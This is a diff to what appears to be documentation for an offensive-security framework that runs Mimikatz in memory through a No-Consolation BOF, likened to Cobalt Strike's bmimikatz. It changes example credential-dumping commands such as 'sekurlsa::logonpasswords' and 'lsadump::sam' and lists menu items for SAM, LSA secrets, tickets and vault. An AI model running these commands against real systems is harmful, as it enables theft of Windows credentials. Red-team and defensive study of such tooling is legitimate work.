@@ -106,11 +106,12 @@ Official Mimikatz PE executed in-memory through No-Consolation. Full module set 
 
 ```
 mimikatz
-mimikatz privilege::debug sekurlsa::logonpasswords exit
-mimikatz privilege::debug token::elevate lsadump::sam exit
+mimikatz privilege::debug sekurlsa::logonpasswords
+mimikatz_small
+logonpasswords
 ```
 
-Access-menu items are added for logonpasswords, tickets, SAM, LSA secrets, cache, vault, ekeys, and coffee.
+Same operator flow as Cobalt Strike `bmimikatz` / `bmimikatz_small` (inline PE via No-Consolation BOF, not a rewrite of gentilkiwi as `.o`). Access-menu items cover logonpasswords, tickets, SAM, LSA secrets, cache, vault, ekeys, and coffee.
 
 
 
